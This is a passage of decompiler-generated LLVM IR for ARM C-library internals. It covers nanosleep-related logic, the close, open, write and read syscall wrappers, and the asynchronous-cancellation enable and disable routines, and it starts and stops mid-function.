  store i1 %v2_28260, i1* %cpsr_c.global-to-local, align 1
  %v7_28260 = icmp eq i32 %v3_2825c, 1
  br i1 %v7_28260, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_28240
  %v3_28264 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_28264, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_28240, %bb
  call void @__pseudo_cond_branch(i1 %v7_28260, i32 ptrtoint (i32* @global_var_23188.3306 to i32))
  %v2_28274 = ptrtoint i32* %stack_var_-32 to i32
  %v2_2827c = call i32 @__libc_nanosleep(i32 %v2_28274, i32 %v2_28274)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_28280 = icmp eq i32 %v2_2827c, 0
  br i1 %v2_28280, label %bb26, label %bb25

bb25:                                             ; preds = %.thread1
  store i32 499999999, i32* %r2.global-to-local, align 4
  %v3_28294 = load i32, i32* %stack_var_-32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br label %bb26

bb26:                                             ; preds = %.thread1, %bb25
  %storemerge = phi i32 [ %v3_28294, %bb25 ], [ 0, %.thread1 ]
  store i32 %storemerge, i32* @r4, align 4
  %v3_282a4 = load i32, i32* %stack_var_-40, align 4
  %v1_282a8 = and i32 %v3_282a4, 65536
  store i32 %v1_282a8, i32* %r2.global-to-local, align 4
  %v2_282a8 = icmp eq i32 %v1_282a8, 0
  br i1 %v2_282a8, label %bb27, label %.thread5

bb27:                                             ; preds = %bb26
  br label %.thread5

.thread5:                                         ; preds = %bb26, %bb27
  call void @__pseudo_cond_branch(i1 %v2_282a8, i32 ptrtoint (i32* @global_var_23188.3306 to i32))
  br label %dec_label_pc_282b8

dec_label_pc_282b8:                               ; preds = %dec_label_pc_281cc, %.thread5
  %v0_282b8 = load i32, i32* @r4, align 4
  store i32 %v3_281a8, i32* @r4, align 4
  store i32 %v6_281a8, i32* @r5, align 4
  store i32 %v9_281a8, i32* @r6, align 4
  store i32 %v12_281a8, i32* @r7, align 4
  store i32 %v15_281a8, i32* @lr, align 4
  ret i32 %v0_282b8

; uselistorder directives
  uselistorder i32 %v0_28220, { 1, 0 }
  uselistorder i32 %v1_28204.pre, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 0, 2, 1 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 5, 6 }
  uselistorder label %dec_label_pc_282b8, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_28240, { 1, 0 }
  uselistorder label %dec_label_pc_28224, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2820c, { 1, 0 }
}

define i32 @function_282cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_282cc:
  %v0_282cc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_282cc, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_282cc
  %v4_282cc = mul i32 %arg1, 2
  %v5_282cc = and i32 %v4_282cc, %arg1
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_282cc, %bb
  %v0_282d0 = phi i32 [ %arg1, %dec_label_pc_282cc ], [ %v5_282cc, %bb ]
  ret i32 %v0_282d0

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI___close_nocancel() local_unnamed_addr {
entry:
  %v0_282f4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_282f4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_282f4 = load i32, i32* @r0, align 4
  ret i32 %v2_282f4

bb1:                                              ; preds = %entry
  %v0_282f8 = call i32 @__syscall_error()
  ret i32 %v0_282f8
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_28304 = load i32, i32* @global_var_49d6c.3309, align 4
  %v2_28308 = icmp eq i32 %v3_28304, 0
  store i1 %v2_28308, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_28308, label %dec_label_pc_28310, label %entry.dec_label_pc_2832c_crit_edge

entry.dec_label_pc_2832c_crit_edge:               ; preds = %entry
  %v3_2832c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_2832c

dec_label_pc_28310:                               ; preds = %entry
  %v0_28310 = load i32, i32* @r7, align 4
  store i32 %v0_28310, i32* @ip, align 4
  %v0_28320 = load i32, i32* @r0, align 4
  %v2_28320 = icmp ugt i32 %v0_28320, -4097
  %v7_28320 = icmp eq i32 %v0_28320, -4096
  store i1 %v7_28320, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_28320, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_2832c, %bb8, %bb9, %dec_label_pc_28310
  %merge2 = phi i32 [ %v0_28320, %dec_label_pc_28310 ], [ %v0_28350, %dec_label_pc_2832c ], [ %v0_28360, %bb8 ], [ %v0_28360, %bb9 ]
  ret i32 %merge2

bb7:                                              ; preds = %dec_label_pc_28310
  %v0_28328 = call i32 @__syscall_error()
  br label %dec_label_pc_2832c

dec_label_pc_2832c:                               ; preds = %entry.dec_label_pc_2832c_crit_edge, %bb7
  %v3_2832c = phi i32 [ %v3_2832c.pre, %entry.dec_label_pc_2832c_crit_edge ], [ %v0_28328, %bb7 ]
  %v9_2832c = load i32, i32* @r7, align 4
  store i32 %v9_2832c, i32* %stack_var_-8, align 4
  %v12_2832c = load i32, i32* @lr, align 4
  %v0_28330 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_28330, i32* @ip, align 4
  store i32 %v3_2832c, i32* @r7, align 4
  %v1_2834c = call i32 @__libc_disable_asynccancel(i32 %v0_28330)
  %v0_28350 = load i32, i32* @r7, align 4
  store i32 %v0_28350, i32* @r0, align 4
  %v2_28354 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_28354, i32* @r7, align 4
  store i32 %v12_2832c, i32* @lr, align 4
  %v2_28358 = icmp ugt i32 %v0_28350, -4097
  %v7_28358 = icmp eq i32 %v0_28350, -4096
  store i1 %v7_28358, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_28358, label %bb8, label %bb

bb8:                                              ; preds = %dec_label_pc_2832c
  %v0_28360 = call i32 @__syscall_error()
  %v0_28370 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_28370, label %bb9, label %bb

bb9:                                              ; preds = %bb8
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_28360, { 1, 0 }
  uselistorder i32 %v0_28350, { 0, 2, 3, 1 }
  uselistorder i32 %v0_28320, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2832c, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__GI___open_nocancel() local_unnamed_addr {
entry:
  %v0_28384 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_28384, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_28384 = load i32, i32* @r0, align 4
  ret i32 %v2_28384

bb1:                                              ; preds = %entry
  %v0_28388 = call i32 @__syscall_error()
  ret i32 %v0_28388
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_28394 = load i32, i32* @global_var_49d6c.3309, align 4
  %v2_28398 = icmp eq i32 %v3_28394, 0
  store i1 %v2_28398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_28398, label %dec_label_pc_283a0, label %entry.dec_label_pc_283bc_crit_edge

entry.dec_label_pc_283bc_crit_edge:               ; preds = %entry
  %v3_283bc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_283bc

dec_label_pc_283a0:                               ; preds = %entry
  %v0_283a0 = load i32, i32* @r7, align 4
  store i32 %v0_283a0, i32* @ip, align 4
  %v0_283b0 = load i32, i32* @r0, align 4
  %v2_283b0 = icmp ugt i32 %v0_283b0, -4097
  %v7_283b0 = icmp eq i32 %v0_283b0, -4096
  store i1 %v7_283b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_283b0, label %bb9, label %bb

bb:                                               ; preds = %dec_label_pc_283bc, %bb10, %bb11, %dec_label_pc_283a0
  %merge2 = phi i32 [ %v0_283b0, %dec_label_pc_283a0 ], [ %v0_283e0, %dec_label_pc_283bc ], [ %v0_283f0, %bb10 ], [ %v0_283f0, %bb11 ]
  ret i32 %merge2

bb9:                                              ; preds = %dec_label_pc_283a0
  %v0_283b8 = call i32 @__syscall_error()
  br label %dec_label_pc_283bc

dec_label_pc_283bc:                               ; preds = %entry.dec_label_pc_283bc_crit_edge, %bb9
  %v3_283bc = phi i32 [ %v3_283bc.pre, %entry.dec_label_pc_283bc_crit_edge ], [ %v0_283b8, %bb9 ]
  store i32 %v3_283bc, i32* %stack_var_-24, align 4
  %v9_283bc = load i32, i32* @r2, align 4
  %v12_283bc = load i32, i32* @r3, align 4
  %v15_283bc = load i32, i32* @r7, align 4
  store i32 %v15_283bc, i32* %stack_var_-8, align 4
  %v18_283bc = load i32, i32* @lr, align 4
  %v0_283c0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_283c0, i32* @ip, align 4
  %v2_283c8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v9_283bc, i32* @r2, align 4
  store i32 %v12_283bc, i32* @r3, align 4
  store i32 %v2_283c8, i32* @r7, align 4
  %v1_283dc = call i32 @__libc_disable_asynccancel(i32 %v0_283c0)
  %v0_283e0 = load i32, i32* @r7, align 4
  store i32 %v0_283e0, i32* @r0, align 4
  %v2_283e4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_283e4, i32* @r7, align 4
  store i32 %v18_283bc, i32* @lr, align 4
  %v2_283e8 = icmp ugt i32 %v0_283e0, -4097
  %v7_283e8 = icmp eq i32 %v0_283e0, -4096
  store i1 %v7_283e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_283e8, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_283bc
  %v0_283f0 = call i32 @__syscall_error()
  %v0_28400 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_28400, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_283f0, { 1, 0 }
  uselistorder i32 %v0_283e0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_283b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_283bc, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__GI___write_nocancel() local_unnamed_addr {
entry:
  %v0_28414 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_28414, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_28414 = load i32, i32* @r0, align 4
  ret i32 %v2_28414

bb1:                                              ; preds = %entry
  %v0_28418 = call i32 @__syscall_error()
  ret i32 %v0_28418
}

define i32 @__GI___libc_write(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = sext i16 %arg2 to i32
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_28424 = load i32, i32* @global_var_49d6c.3309, align 4
  %v2_28428 = icmp eq i32 %v3_28424, 0
  store i1 %v2_28428, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_28428, label %dec_label_pc_28430, label %entry.dec_label_pc_2844c_crit_edge

entry.dec_label_pc_2844c_crit_edge:               ; preds = %entry
  %v3_2844c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_2844c

dec_label_pc_28430:                               ; preds = %entry
  %v0_28430 = load i32, i32* @r7, align 4
  store i32 %v0_28430, i32* @ip, align 4
  %v0_28440 = load i32, i32* @r0, align 4
  %v2_28440 = icmp ugt i32 %v0_28440, -4097
  %v7_28440 = icmp eq i32 %v0_28440, -4096
  store i1 %v7_28440, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_28440, label %bb11, label %bb

bb:                                               ; preds = %dec_label_pc_2844c, %bb12, %bb13, %dec_label_pc_28430
  %merge3 = phi i32 [ %v0_28440, %dec_label_pc_28430 ], [ %v0_28470, %dec_label_pc_2844c ], [ %v0_28480, %bb12 ], [ %v0_28480, %bb13 ]
  ret i32 %merge3

bb11:                                             ; preds = %dec_label_pc_28430
  %v0_28448 = call i32 @__syscall_error()
  br label %dec_label_pc_2844c

dec_label_pc_2844c:                               ; preds = %entry.dec_label_pc_2844c_crit_edge, %bb11
  %v3_2844c = phi i32 [ %v3_2844c.pre, %entry.dec_label_pc_2844c_crit_edge ], [ %v0_28448, %bb11 ]
  store i32 %v3_2844c, i32* %stack_var_-24, align 4
  %v17_2844c = load i32, i32* @r3, align 4
  %v20_2844c = load i32, i32* @r7, align 4
  store i32 %v20_2844c, i32* %stack_var_-8, align 4
  %v23_2844c = load i32, i32* @lr, align 4
  %v0_28450 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_28450, i32* @ip, align 4
  %v2_28458 = load i32, i32* %stack_var_-24, align 4
  store i32 %tmp, i32* @r1, align 4
  store i32 %v17_2844c, i32* @r3, align 4
  store i32 %v2_28458, i32* @r7, align 4
  %v1_2846c = call i32 @__libc_disable_asynccancel(i32 %v0_28450)
  %v0_28470 = load i32, i32* @r7, align 4
  store i32 %v0_28470, i32* @r0, align 4
  %v2_28474 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_28474, i32* @r7, align 4
  store i32 %v23_2844c, i32* @lr, align 4
  %v2_28478 = icmp ugt i32 %v0_28470, -4097
  %v7_28478 = icmp eq i32 %v0_28470, -4096
  store i1 %v7_28478, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_28478, label %bb12, label %bb

bb12:                                             ; preds = %dec_label_pc_2844c
  %v0_28480 = call i32 @__syscall_error()
  %v0_28490 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_28490, label %bb13, label %bb

bb13:                                             ; preds = %bb12
  %v1_28490 = load i32, i32* @r1, align 4
  %v2_28490 = trunc i32 %v1_28490 to i16
  %v3_28490 = load i32, i32* @r2, align 4
  %v4_28490 = inttoptr i32 %v3_28490 to i16*
  store i16 %v2_28490, i16* %v4_28490, align 2
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_28480, { 1, 0 }
  uselistorder i32 %v0_28470, { 0, 2, 3, 1 }
  uselistorder i32 %v0_28440, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2844c, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__read_nocancel() local_unnamed_addr {
entry:
  %v0_284a4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_284a4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_284a4 = load i32, i32* @r0, align 4
  ret i32 %v2_284a4

bb1:                                              ; preds = %entry
  %v0_284a8 = call i32 @__syscall_error()
  ret i32 %v0_284a8
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_284b4 = load i32, i32* @global_var_49d6c.3309, align 4
  %v2_284b8 = icmp eq i32 %v3_284b4, 0
  br i1 %v2_284b8, label %dec_label_pc_284c0, label %entry.dec_label_pc_284dc_crit_edge

entry.dec_label_pc_284dc_crit_edge:               ; preds = %entry
  %v3_284dc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_284dc

dec_label_pc_284c0:                               ; preds = %entry
  %v0_284c0 = load i32, i32* @r7, align 4
  store i32 %v0_284c0, i32* @ip, align 4
  %v0_284d0 = load i32, i32* @r0, align 4
  %v2_284d0 = icmp ugt i32 %v0_284d0, -4097
  br i1 %v2_284d0, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_284dc, %dec_label_pc_284c0
  %merge = phi i32 [ %v0_284d0, %dec_label_pc_284c0 ], [ %v0_28500, %dec_label_pc_284dc ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_284c0
  %v0_284d8 = call i32 @__syscall_error()
  br label %dec_label_pc_284dc

dec_label_pc_284dc:                               ; preds = %entry.dec_label_pc_284dc_crit_edge, %bb8
  %v3_284dc = phi i32 [ %v3_284dc.pre, %entry.dec_label_pc_284dc_crit_edge ], [ %v0_284d8, %bb8 ]
  %v15_284dc = load i32, i32* @r7, align 4
  store i32 %v15_284dc, i32* %stack_var_-8, align 4
  %v18_284dc = load i32, i32* @lr, align 4
  %v0_284e0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_284e0, i32* @ip, align 4
  store i32 %v3_284dc, i32* @r7, align 4
  %v1_284fc = call i32 @__libc_disable_asynccancel(i32 %v0_284e0)
  %v0_28500 = load i32, i32* @r7, align 4
  store i32 %v0_28500, i32* @r0, align 4
  %v2_28504 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_28504, i32* @r7, align 4
  store i32 %v18_284dc, i32* @lr, align 4
  %v2_28508 = icmp ugt i32 %v0_28500, -4097
  br i1 %v2_28508, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_284dc
  %v0_28510 = call i32 @__syscall_error()
  ret i32 %v0_28510

; uselistorder directives
  uselistorder i32 %v0_28500, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 8, 7, 12, 3, 2, 11, 1, 0, 10, 6, 5, 9, 4 }
  uselistorder label %dec_label_pc_284dc, { 1, 0 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_28520 = load i32, i32* %r0.global-to-local, align 4
  %v1_28520 = and i32 %v0_28520, 2
  %v2_28520 = icmp eq i32 %v1_28520, 0
  %v3_28524 = load i32, i32* @r4, align 4
  store i32 %v3_28524, i32* %stack_var_-16, align 4
  br i1 %v2_28520, label %dec_label_pc_2852c, label %dec_label_pc_285a0

dec_label_pc_2852c:                               ; preds = %entry
  %v0_2852c = call i32 @__aeabi_read_tp()
  store i32 %v0_2852c, i32* %r0.global-to-local, align 4
  %v1_28530 = add i32 %v0_2852c, -1036
  %v2_28530 = inttoptr i32 %v1_28530 to i32*
  %v3_28530 = load i32, i32* %v2_28530, align 4
  %v1_28534 = add i32 %v0_2852c, -1168
  store i32 %v1_28534, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_28538

dec_label_pc_28538:                               ; preds = %dec_label_pc_2856c.dec_label_pc_28538_crit_edge, %dec_label_pc_2852c
  %v0_28544 = phi i32 [ %v0_28544.pre, %dec_label_pc_2856c.dec_label_pc_28538_crit_edge ], [ %v1_28534, %dec_label_pc_2852c ]
  %v0_28538 = phi i32 [ %v0_2856c, %dec_label_pc_2856c.dec_label_pc_28538_crit_edge ], [ %v3_28530, %dec_label_pc_2852c ]
  %v1_28538 = and i32 %v0_28538, -3
  store i32 %v1_28538, i32* %r7.global-to-local, align 4
  store i32 %v0_28538, i32* %r4.global-to-local, align 4
  store i32 %v1_28538, i32* @r1, align 4
  %v1_28544 = add i32 %v0_28544, 132
  store i32 %v1_28544, i32* @r2, align 4
  %v1_2854823 = inttoptr i32 %v1_28544 to i32*
  %v2_2854824 = load i32, i32* %v1_2854823, align 4
  %v3_2854c26 = icmp uge i32 %v2_2854824, %v0_28538
  store i1 %v3_2854c26, i1* %cpsr_c.global-to-local, align 1
  %v9_2854c32 = icmp eq i32 %v2_2854824, %v0_28538
  br i1 %v9_2854c32, label %dec_label_pc_28554, label %dec_label_pc_2856c

dec_label_pc_28554:                               ; preds = %dec_label_pc_28538, %dec_label_pc_28554.dec_label_pc_28548_crit_edge
  %v0_2855433 = phi i32 [ %v1_2854c.pre, %dec_label_pc_28554.dec_label_pc_28548_crit_edge ], [ %v0_28538, %dec_label_pc_28538 ]
  store i32 %v0_2855433, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_28564 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_28564, label %dec_label_pc_28568, label %dec_label_pc_28554.dec_label_pc_28548_crit_edge

dec_label_pc_28554.dec_label_pc_28548_crit_edge:  ; preds = %dec_label_pc_28554
  %v0_28548.pre = load i32, i32* @r2, align 4
  %v1_2854c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_28548 = inttoptr i32 %v0_28548.pre to i32*
  %v2_28548 = load i32, i32* %v1_28548, align 4
  %v3_2854c = icmp uge i32 %v2_28548, %v1_2854c.pre
  store i1 %v3_2854c, i1* %cpsr_c.global-to-local, align 1
  %v9_2854c = icmp eq i32 %v2_28548, %v1_2854c.pre
  br i1 %v9_2854c, label %dec_label_pc_28554, label %dec_label_pc_2856c

dec_label_pc_28568:                               ; preds = %dec_label_pc_28554
  %v0_28568 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_2856c

dec_label_pc_2856c:                               ; preds = %dec_label_pc_28538, %dec_label_pc_28554.dec_label_pc_28548_crit_edge, %dec_label_pc_28568
  %v0_2856c = phi i32 [ %v0_28568, %dec_label_pc_28568 ], [ %v2_2854824, %dec_label_pc_28538 ], [ %v2_28548, %dec_label_pc_28554.dec_label_pc_28548_crit_edge ]
  %v1_2856c = phi i32 [ %v0_28568, %dec_label_pc_28568 ], [ %v0_28538, %dec_label_pc_28538 ], [ %v1_2854c.pre, %dec_label_pc_28554.dec_label_pc_28548_crit_edge ]
  %v3_2856c = icmp uge i32 %v0_2856c, %v1_2856c
  store i1 %v3_2856c, i1* %cpsr_c.global-to-local, align 1
  %v9_2856c = icmp eq i32 %v0_2856c, %v1_2856c
  br i1 %v9_2856c, label %dec_label_pc_28594.preheader, label %dec_label_pc_2856c.dec_label_pc_28538_crit_edge

dec_label_pc_2856c.dec_label_pc_28538_crit_edge:  ; preds = %dec_label_pc_2856c
  %v0_28544.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_28538

dec_label_pc_28594.preheader:                     ; preds = %dec_label_pc_2856c
  %v0_285941 = load i32, i32* %r7.global-to-local, align 4
  %v1_285942 = and i32 %v0_285941, 12
  store i32 %v1_285942, i32* @r3, align 4
  %v2_285983 = icmp ugt i32 %v1_285942, 3
  store i1 %v2_285983, i1* %cpsr_c.global-to-local, align 1
  %v7_285985 = icmp eq i32 %v1_285942, 4
  br i1 %v7_285985, label %dec_label_pc_28578.lr.ph, label %dec_label_pc_28594.preheader.dec_label_pc_285a0.loopexit_crit_edge

dec_label_pc_28594.preheader.dec_label_pc_285a0.loopexit_crit_edge: ; preds = %dec_label_pc_28594.preheader
  %v1_285a4.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_285a0.loopexit

dec_label_pc_28578.lr.ph:                         ; preds = %dec_label_pc_28594.preheader
  %v0_2857c.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_2857c = add i32 %v0_2857c.pre, 132
  %v2_28590 = inttoptr i32 %v1_2857c to i32*
  br label %dec_label_pc_28578

dec_label_pc_28578:                               ; preds = %dec_label_pc_28578.lr.ph, %dec_label_pc_28578
  %v0_28578 = phi i32 [ %v0_285941, %dec_label_pc_28578.lr.ph ], [ %v3_28590, %dec_label_pc_28578 ]
  store i32 %v0_28578, i32* @r2, align 4
  store i32 %v1_2857c, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  %v3_28590 = load i32, i32* %v2_28590, align 4
  store i32 %v3_28590, i32* %r7.global-to-local, align 4
  %v1_28594 = and i32 %v3_28590, 12
  store i32 %v1_28594, i32* @r3, align 4
  %v7_28598 = icmp eq i32 %v1_28594, 4
  br i1 %v7_28598, label %dec_label_pc_28578, label %dec_label_pc_28594.dec_label_pc_285a0.loopexit_crit_edge

dec_label_pc_28594.dec_label_pc_285a0.loopexit_crit_edge: ; preds = %dec_label_pc_28578
  %v2_28598 = icmp ugt i32 %v1_28594, 3
  store i1 %v2_28598, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_285a0.loopexit

dec_label_pc_285a0.loopexit:                      ; preds = %dec_label_pc_28594.preheader.dec_label_pc_285a0.loopexit_crit_edge, %dec_label_pc_28594.dec_label_pc_285a0.loopexit_crit_edge
  %v1_285a4.pre = phi i32 [ %v1_285a4.pre.pre, %dec_label_pc_28594.preheader.dec_label_pc_285a0.loopexit_crit_edge ], [ %v1_2857c, %dec_label_pc_28594.dec_label_pc_285a0.loopexit_crit_edge ]
  %v2_285a0.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_285a0

dec_label_pc_285a0:                               ; preds = %dec_label_pc_285a0.loopexit, %entry
  %v1_285a4 = phi i32 [ %v1_285a4.pre, %dec_label_pc_285a0.loopexit ], [ %v0_28520, %entry ]
  %v2_285a0 = phi i32 [ %v2_285a0.pre, %dec_label_pc_285a0.loopexit ], [ %v3_28524, %entry ]
  store i32 %v2_285a0, i32* @r4, align 4
  ret i32 %v1_285a4

; uselistorder directives
  uselistorder i32 %v3_28590, { 1, 2, 0 }
  uselistorder i32 %v1_2857c, { 0, 2, 1 }
  uselistorder i32 %v0_28568, { 1, 0 }
  uselistorder i32 %v1_2854c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_28538, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 0, 3, 5, 4, 2 }
  uselistorder label %dec_label_pc_285a0.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_28578, { 1, 0 }
  uselistorder label %dec_label_pc_2856c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_28554, { 1, 0 }
}

define i32 @__libc_enable_asynccancel() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_285a8 = load i32, i32* @r4, align 4
  store i32 %v3_285a8, i32* %stack_var_-24, align 4
  store i32 107276, i32* %r8.global-to-local, align 4
  %v0_285b0 = call i32 @__aeabi_read_tp()
  %v1_285b4 = add i32 %v0_285b0, -1036
  %v2_285b4 = inttoptr i32 %v1_285b4 to i32*
  %v3_285b4 = load i32, i32* %v2_285b4, align 4
  store i32 %v3_285b4, i32* %r6.global-to-local, align 4
  %v1_285b8 = add i32 %v0_285b0, -1168
  store i32 %v1_285b8, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r8.global-to-local, align 4
  %v1_285c046 = or i32 %v3_285b4, 2
  store i32 %v1_285c046, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_285c449 = icmp eq i32 %v1_285c046, %v3_285b4
  br i1 %v9_285c449, label %dec_label_pc_28670, label %dec_label_pc_285cc

dec_label_pc_285cc:                               ; preds = %entry, %bb.dec_label_pc_285cc_crit_edge
  %v0_285d0 = phi i32 [ %v0_285d0.pre, %bb.dec_label_pc_285cc_crit_edge ], [ %v1_285b8, %entry ]
  %v0_285d450 = phi i32 [ %v1_28600, %bb.dec_label_pc_285cc_crit_edge ], [ %v3_285b4, %entry ]
  %v1_285d0 = add i32 %v0_285d0, 132
  store i32 %v1_285d0, i32* %r2.global-to-local, align 4
  store i32 %v0_285d450, i32* %r4.global-to-local, align 4
  %v1_285d834 = inttoptr i32 %v1_285d0 to i32*
  %v2_285d835 = load i32, i32* %v1_285d834, align 4
  store i32 %v2_285d835, i32* @r3, align 4
  %v3_285dc37 = icmp uge i32 %v2_285d835, %v0_285d450
  store i1 %v3_285dc37, i1* %cpsr_c.global-to-local, align 1
  %v9_285dc43 = icmp eq i32 %v2_285d835, %v0_285d450
  br i1 %v9_285dc43, label %dec_label_pc_285e4, label %dec_label_pc_285fc

dec_label_pc_285e4:                               ; preds = %dec_label_pc_285cc, %dec_label_pc_285e4.dec_label_pc_285d8_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_285f4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_285f4, label %dec_label_pc_285f8, label %dec_label_pc_285e4.dec_label_pc_285d8_crit_edge

dec_label_pc_285e4.dec_label_pc_285d8_crit_edge:  ; preds = %dec_label_pc_285e4
  %v0_285d8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_285dc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_285d8 = inttoptr i32 %v0_285d8.pre to i32*
  %v2_285d8 = load i32, i32* %v1_285d8, align 4
  store i32 %v2_285d8, i32* @r3, align 4
  %v3_285dc = icmp uge i32 %v2_285d8, %v1_285dc.pre
  store i1 %v3_285dc, i1* %cpsr_c.global-to-local, align 1
  %v9_285dc = icmp eq i32 %v2_285d8, %v1_285dc.pre
  br i1 %v9_285dc, label %dec_label_pc_285e4, label %dec_label_pc_285fc

